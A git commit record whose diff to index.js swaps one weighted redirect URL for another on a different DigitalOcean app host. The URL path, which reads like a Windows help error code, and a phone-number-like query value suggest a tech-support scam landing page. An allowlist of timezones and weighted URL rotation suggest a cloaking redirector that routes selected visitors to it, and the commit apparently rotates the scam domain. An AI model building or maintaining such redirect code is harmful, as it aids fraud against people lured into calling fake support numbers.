27e62fd58c2b2878aa4f8f6ad6225c367ba607c2
paalakash <palaksh452@gmail.com>
2026-07-01 07:13:30 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://goldfish-app-siks2.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-403-676", weight: 1.0 }
+    { url: "https://stingray-app-hahgf.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-403-676", weight: 1.0 }
 
 ];
 
